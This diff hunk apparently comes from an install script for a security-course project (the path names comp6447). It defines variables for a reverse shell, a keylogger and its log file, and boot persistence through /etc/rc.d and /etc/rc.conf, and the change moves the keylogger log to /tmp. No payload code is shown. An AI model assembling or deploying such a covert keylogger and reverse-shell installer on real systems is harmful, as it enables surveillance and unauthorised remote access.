@@ -38,7 +38,7 @@ RSHELL="rshell_target"
 RSHELL_CONF_FILE="rshell"
 KEYLOG="keylog_target"
 KEYLOG_CONF_FILE="keylog"
-KEYLOG_LOG_FILE="/usr/home/comp6447/keylog_file"
+KEYLOG_LOG_FILE="/tmp/keylog_file"
 
 RC_INSTALL_LOCATION="/etc/rc.d/"
 RC_CONF_FILE="/etc/rc.conf"
